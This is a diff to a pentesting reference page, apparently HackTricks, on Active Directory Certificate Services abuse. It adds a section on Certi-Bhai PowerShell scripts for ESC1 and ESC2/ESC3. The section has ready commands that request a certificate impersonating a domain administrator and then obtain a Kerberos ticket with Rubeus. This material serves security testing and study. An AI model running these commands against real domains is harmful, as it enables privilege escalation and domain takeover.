@@ -145,6 +145,26 @@ The **users** who are allowed to **obtain** an **enrollment agent certificate**,
 
 However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.
 
+### Windows-only PowerShell PoCs with Certi-Bhai
+
+[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) exercises ESC1 and ESC2/ESC3 without Certify or Certipy. Its scripts create an exportable 2048-bit RSA key with the `X509Enrollment` COM API, build a PKCS#10 request, discover the first `pKIEnrollmentService` through LDAP, submit it through `CertificateAuthority.Request`, install the response in `Cert:\CurrentUser\My`, and export a Base64-encoded PFX. The ESC1 script adds an attacker-selected UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, value `0xb`), whereas the ESC2/ESC3 scripts use the first certificate to sign a PKCS#7 on-behalf-of request.<sup>[[27]](#references)</sup>
+
+```powershell
+# ESC1: supply the identity in the subject and UPN SAN
+.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
+  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"
+
+# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
+.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
+  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
+```
+
+The scripts print the Base64 of the **PFX**, which includes the private key, for direct use with Rubeus. Do not replace it with `[Convert]::ToBase64String($cert.RawData)`: `RawData` encodes only the public certificate and cannot sign the PKINIT request.<sup>[[5]](#references)[[27]](#references)</sup>
+
+```powershell
+Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
+```
+
 ## Vulnerable Certificate Template Access Control - ESC4
 
 ### **Explanation**
@@ -1149,5 +1169,6 @@ Both scenarios lead to an **increase in the attack surface** from one forest to 
 - [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
 - [25] [Microsoft – Event 4768: A Kerberos authentication ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
 - [26] [Microsoft – Event 4769: A Kerberos service ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
+- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
 
 {{#include ../../../banners/hacktricks-training.md}}
